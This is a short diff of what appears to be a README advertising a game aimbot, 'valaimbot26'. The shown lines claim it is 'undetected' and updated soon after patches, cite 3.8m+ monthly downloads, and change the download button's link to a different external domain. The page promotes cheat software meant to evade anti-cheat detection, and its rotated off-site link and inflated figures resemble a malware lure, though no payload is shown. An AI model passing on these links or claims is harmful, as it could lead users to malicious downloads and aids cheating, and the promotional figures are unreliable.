@@ -49,7 +49,7 @@ A: Yes — undetected, updated within 24h of patches.
 
 **Monthly downloads:** 3.8m+
 
-[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/valaimbot26)
+[![Download](https://img.shields.io/badge/Download-v5.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/valaimbot26)
 
 ---
 
